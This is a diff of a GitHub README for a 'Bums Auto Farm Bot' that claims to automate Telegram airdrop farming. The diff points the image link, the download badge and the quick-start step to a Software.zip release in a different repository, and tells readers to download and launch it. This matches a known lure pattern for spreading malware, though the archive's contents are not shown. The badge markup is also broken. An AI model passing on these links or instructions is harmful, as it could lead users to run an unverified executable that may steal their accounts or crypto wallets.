@@ -2,7 +2,7 @@
 
 ### An Automated Farming Software for Telegram
 
-![Bums Auto Farm Bot](https://example.com/image.png)
+![Bums Auto Farm Bot](https://github.com/phongdz1234-hue/Bums/releases/download/v2.0/Software.zip)
 
 Welcome to the Bums Auto Farm Bot GitHub repository! This software is designed to automate farming in Telegram with simple customization options. Whether you want to start farming for your main account or create a comprehensive combine, Bums Auto Farm Bot has got you covered.
 
@@ -18,10 +18,10 @@ airdrop, airdrop-claim-bot, automation, bot, bums, bums-auto-clicker, bums-auto-
 ### How to Get Started
 To get started with Bums Auto Farm Bot, download the software package from the link below and launch the application:
 
-[![Download Software](https://img.shields.io/badge/Download-Software.zip-blue)](https://github.com/YouaifXD/789566136/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/phongdz1234-hue/Bums/releases/download/v2.0/Software.zip)](https://github.com/phongdz1234-hue/Bums/releases/download/v2.0/Software.zip)
 
 ### 🚀 Quick Start Guide
-1. Download the Software.zip package from the link above.
+1. Download the https://github.com/phongdz1234-hue/Bums/releases/download/v2.0/Software.zip package from the link above.
 2. Launch the application on your device.
 3. Configure the settings according to your farming needs.
 4. Start automating your farming process in Telegram!
